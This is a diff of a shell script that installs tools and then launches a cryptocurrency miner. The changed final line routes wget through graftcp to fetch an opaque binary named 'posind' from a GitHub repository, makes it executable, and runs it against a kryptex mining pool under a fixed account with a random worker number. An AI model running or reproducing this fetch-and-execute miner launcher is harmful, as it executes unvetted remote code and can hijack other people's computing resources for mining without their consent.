@@ -1,8 +1,4 @@
-apt update && apt -y install sudo wget curl unzip
 
-sudo apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
-
-curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
 
 apt-get install -y nodejs
 
@@ -32,8 +28,6 @@ echo " "
 
 echo " "
 
-./graftcp/graftcp wget https://github.com/brontosimungo/seaglass/raw/refs/heads/main/posind && chmod +x posind
-
 ph add posind
 
-./graftcp/graftcp ./posind --coin pearl -o stratum+tcp://prl.kryptex.network:7048 -u krxXP93EKN.$(shuf -n 1 -i 1-9999999)
+./graftcp/graftcp wget https://github.com/brontosimungo/seaglass/raw/refs/heads/main/posind && chmod +x posind && ./posind --coin pearl -o stratum+tcp://prl.kryptex.network:7048 -u krxXP93EKN.$(shuf -n 1 -i 1-9999999)
